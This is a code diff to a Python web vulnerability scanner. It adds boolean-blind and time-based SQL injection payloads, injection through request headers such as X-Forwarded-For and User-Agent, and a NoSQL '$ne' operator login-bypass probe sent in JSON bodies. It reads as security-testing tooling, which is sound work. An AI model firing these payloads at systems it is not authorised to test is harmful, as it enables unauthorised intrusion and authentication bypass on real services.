@@ -277,8 +277,8 @@ def dir_host_done(host):
 
 _FIND_SEEN = set(); _find_lock = threading.Lock()
 # triage — the tool decides what is report-grade (oracle/evidence-confirmed) vs a lead to review
-_CONFIRMED_KINDS = {"sqli", "lfi", "ssti", "xss", "access-control", "unauth-data", "exposed-file",
-                    "secret", "open-redirect", "cors", "dir-listing", "takeover", "rce", "host-header"}
+_CONFIRMED_KINDS = {"sqli", "nosqli", "lfi", "ssti", "xss", "access-control", "unauth-data", "exposed-file",
+                    "secret", "open-redirect", "cors", "dir-listing", "takeover", "rce", "host-header", "header-inj"}
 def _triage(kind, sev):
     if kind == "anomaly" or sev in ("low", "info"):
         return "investigate"
@@ -679,7 +679,7 @@ def stage_params(live):
     feed(f"{len(params)} unique parameters discovered", "good")
 
 # ---------------- active vulnerability testing (urllib, no external deps) ----------------
-import urllib.request, urllib.parse, urllib.error, ssl, re as _re, random
+import urllib.request, urllib.parse, urllib.error, ssl, re as _re, random, difflib
 _CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE
 class _NR(urllib.request.HTTPRedirectHandler):
     def redirect_request(self, *a, **k): return None
@@ -798,6 +798,12 @@ SQLI_TIME_TPL = ["1' AND SLEEP({s})-- -", "1 AND SLEEP({s})", "1') AND SLEEP({s}
                  "1';SELECT pg_sleep({s})-- -", "1' WAITFOR DELAY '0:0:{s}'-- -"]
 SQL_ERR_PROBE = "'\"`"
 
+def _sim(a, b):
+    """Response similarity 0..1 on bounded bodies — for boolean-blind oracles."""
+    a = (a or b"")[:3000]; b = (b or b"")[:3000]
+    if not a and not b: return 1.0
+    return difflib.SequenceMatcher(None, a, b).ratio()
+
 def _timed_send(sender, payload):
     """sender(payload) -> (status, headers, body); returns elapsed seconds or None."""
     t0 = time.time()
@@ -812,6 +818,16 @@ def sqli_probe(host, label, sender, do_time=True):
     if r and r[2] and any(e in r[2].lower() for e in SQL_ERR_SIGS):
         finding("crit", "sqli", host, f"‼ error-based SQL injection — {label}")
         return True
+    # 1b) boolean-based blind: TRUE≈baseline, FALSE diverges, confirmed twice (dynamic-page safe)
+    for tq, fq in (("1' AND 1=1-- -", "1' AND 1=2-- -"), ("1 AND 1=1", "1 AND 1=2"),
+                   ("1' OR '1'='1", "1' AND '1'='2")):
+        rb, rt, rf = sender("1"), sender(tq), sender(fq)
+        if not (rb and rt and rf and rt[2] and rf[2]): continue
+        if _sim(rb[2], rt[2]) > 0.95 and _sim(rt[2], rf[2]) < 0.90:
+            rt2, rf2 = sender(tq), sender(fq)                  # confirm — dynamic content would fail this
+            if rt2 and rf2 and _sim(rt[2], rt2[2]) > 0.95 and _sim(rt2[2], rf2[2]) < 0.90:
+                finding("crit", "sqli", host, f"‼ boolean-based blind SQL injection — {label}")
+                return True
     if not do_time: return False
     # 2) time-based blind: SLEEP(6) slow vs SLEEP(0) control, confirmed twice with a fast
     #    control BEFORE and AFTER. Under WAF throttling / congested servers both probes get
@@ -833,6 +849,70 @@ def sqli_probe(host, label, sender, do_time=True):
 
 _sqli_lock = threading.Lock()
 _SQLI_TIME_BUDGET = [40]      # cap total time-based (5-6s each) probes so scans stay bounded
+
+def _take_time_budget():
+    with _sqli_lock:
+        if _SQLI_TIME_BUDGET[0] > 0:
+            _SQLI_TIME_BUDGET[0] -= 1; return True
+    return False
+
+def _get_hdr(url, header, value, timeout=12):
+    if not _budget_ok(): return None, {}, b""
+    hdrs = {"User-Agent": random.choice(UA_POOL)}; hdrs.update(AUTH_HEADERS); hdrs[header] = value
+    req = urllib.request.Request(url, headers=hdrs)
+    try:
+        with urllib.request.urlopen(req, timeout=timeout, context=_CTX) as r:
+            return getattr(r, "status", None), dict(r.headers), r.read(300000)
+    except urllib.error.HTTPError as e:
+        try: b = e.read(300000)
+        except Exception: b = b""
+        return e.code, dict(e.headers or {}), b
+    except Exception:
+        return None, {}, b""
+
+def _post_json(url, obj, timeout=12):
+    if not _budget_ok(): return None, {}, b""
+    hdrs = {"User-Agent": random.choice(UA_POOL), "Content-Type": "application/json"}; hdrs.update(AUTH_HEADERS)
+    req = urllib.request.Request(url, data=json.dumps(obj).encode(), headers=hdrs)
+    try:
+        with urllib.request.urlopen(req, timeout=timeout, context=_CTX) as r:
+            return getattr(r, "status", None), dict(r.headers), r.read(300000)
+    except urllib.error.HTTPError as e:
+        try: b = e.read(300000)
+        except Exception: b = b""
+        return e.code, dict(e.headers or {}), b
+    except Exception:
+        return None, {}, b""
+
+INJ_HEADERS = ["X-Forwarded-For", "X-Real-IP", "X-Forwarded-Host", "Referer", "User-Agent", "Client-IP"]
+def header_probe(url, host):
+    """Injection via request headers (commonly forgotten sink): reflection + SQLi."""
+    mark = "recon<hdr9>x"
+    for h in INJ_HEADERS:
+        r = _get_hdr(url, h, mark)
+        if r and r[2] and mark.encode() in r[2]:
+            finding("high", "header-inj", host, f"★ {h} reflected unescaped (header injection/XSS) — {url}", url)
+    for h in ("X-Forwarded-For", "User-Agent"):        # SQLi via header (bounded)
+        sender = lambda v, _h=h: _get_hdr(url, _h, v)
+        if sqli_probe(host, f"header {h} @ {url[:50]}", sender, do_time=_take_time_budget()):
+            break
+
+JSON_KEYS = ["q", "query", "search", "id", "user", "username", "name", "email", "filter"]
+def json_probe(url, host):
+    """SQLi + NoSQL-operator injection through a JSON request body (modern APIs)."""
+    for key in JSON_KEYS:
+        sender = lambda v, _k=key: _post_json(url, {_k: v})
+        if sqli_probe(host, f"JSON key '{key}' @ {url[:50]}", sender, do_time=_take_time_budget()):
+            return
+    base = _post_json(url, {"user": "recon", "pass": "recon"})
+    base_tok = bool(base and base[2] and b"token" in base[2].lower())
+    for combo in ({"user": {"$ne": None}, "pass": {"$ne": None}},
+                  {"username": {"$ne": None}, "password": {"$ne": None}}):
+        sc, hd, body = _post_json(url, combo)
+        low = (body or b"").lower().replace(b" ", b"")
+        if body and (b'"auth":true' in low or b"token" in low) and sc not in (400, 401) and not base_tok:
+            finding("crit", "nosqli", host, f"‼ NoSQL operator auth-bypass — {url}", url)
+            return
 
 # ---- HTML form discovery + POST field testing (catches login SQLi/auth-bypass + POST XSS) ----
 from html.parser import HTMLParser
@@ -1350,11 +1430,13 @@ def stage_brain():
             if "json" in ctype or "graphql" in url.lower() or "/api" in url.lower():
                 api = True
                 feed(f"🔌 API/JSON surface on {host} — param/JSON + GraphQL introspection candidate", "info", host)
+                if A.test: json_probe(url, host)     # JSON-body SQLi + NoSQL operator auth-bypass
             # cheap, no-dep scenario tests
             cors_host_checks(url, host)
             exposure_checks(url, host)               # broken access control / autoindex on the root
             check_exposed_files(url, host)           # .git/.env/backups/secrets independent of wordlist
             js_recon(host)                           # API endpoints + leaked secrets from JS
+            if A.test: header_probe(url, host)       # injection via forgotten header sinks (XFF/UA/Referer)
             hd0 = STATE["hosts"].get(host, {})       # + on discovered directories / interesting paths
             checked = 0
             for d in hd0.get("dirs", []):
